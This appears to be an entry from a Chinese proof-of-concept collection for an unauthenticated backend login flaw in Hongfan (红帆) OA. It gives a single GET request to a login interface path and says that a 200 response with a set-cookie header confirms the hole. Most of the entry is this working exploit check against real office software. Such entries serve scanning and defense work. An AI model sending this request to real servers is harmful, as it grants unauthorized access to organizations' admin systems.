﻿# 红帆 OA 未授权登录后台

> 更新时间：2023-12-04

> 漏洞编号：

> 漏洞说明：红帆 OA 未授权登录后台

> 漏洞特征：

> 验证脚本：HTTP

```
GET /iOffice/prg/interface/iologin215host.aspx HTTP/1.1
```

> 响应代码特征：200

> 响应内容特征：set-cookie

> 上传文件定位：

> 验证文件来源：红帆 OA 未授权登录后台.poc
